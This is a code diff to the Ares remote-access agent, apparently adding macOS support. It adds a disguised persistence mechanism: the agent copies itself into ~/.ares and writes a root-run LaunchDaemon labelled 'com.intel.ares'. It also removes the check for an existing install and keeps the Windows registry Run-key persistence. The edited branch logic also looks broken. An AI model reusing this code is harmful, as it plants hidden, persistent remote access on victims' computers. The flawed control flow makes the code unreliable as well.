@@ -41,13 +41,16 @@ class Agent(object):
         self.uid = self.get_UID()
         self.hostname = socket.gethostname()
         self.username = getpass.getuser()
+        self.rootPachName = 'ares'
 
     def get_install_dir(self):
-        install_dir = None
+        install_dir = None       
         if platform.system() == 'Linux':
-            install_dir = self.expand_path('~/.ares')
+            install_dir = self.expand_path('~/.%s' % self.rootPachName)
         elif platform.system() == 'Windows':
-            install_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
+            install_dir = os.path.join(os.getenv('USERPROFILE'), self.rootPachName)
+        elif platform.system() == 'Darwin':
+            install_dir = self.expand_path('~/.%s' % self.rootPachName)
         if os.path.exists(install_dir):
             return install_dir
         else:
@@ -165,9 +168,9 @@ class Agent(object):
         if not getattr(sys, 'frozen', False):
             self.send_output('[!] Persistence only supported on compiled agents.')
             return
-        if self.is_installed():
-            self.send_output('[!] Agent seems to be already installed.')
-            return
+        # if self.is_installed():
+        #     self.send_output('[!] Agent seems to be already installed.')
+        #     return
         if platform.system() == 'Linux':
             persist_dir = self.expand_path('~/.ares')
             if not os.path.exists(persist_dir):
@@ -184,6 +187,38 @@ class Agent(object):
             shutil.copyfile(sys.executable, agent_path)
             cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares /t REG_SZ /d \"%s\"" % agent_path
             subprocess.Popen(cmd, shell=True)
+        if platform.system() == 'Darwin':
+            persist_dir = self.expand_path('~/.ares')
+            if not os.path.exists(persist_dir):
+                os.makedirs(persist_dir)
+            agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
+            shutil.copyfile(sys.executable, agent_path)
+            os.system('chmod +x ' + agent_path)
+            comIntelAresPlist = """
+            <?xml version="1.0" encoding="UTF-8"?>
+            <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+            <plist version="1.0">
+            <dict>
+                    <key>ares</key>
+                    <false/>
+                    <key>Label</key>
+                    <string>com.intel.ares</string>
+                    <key>ProgramArguments</key>
+                    <array>
+                            <string>%s</string>
+                    </array>
+                    <key>RunAtLoad</key>
+                <true/>
+                <key>UserName</key>
+                <string>root</string>
+            </dict>
+            </plist>
+            """ % agent_path
+            filename = '/Library/LaunchDaemons/com.intel.ares.plist'
+            with open(filename, 'w') as file_object:
+                file_object.write(comIntelAresPlist)
+
+
         else:
             self.send_output('[!] Not supported.')
             return
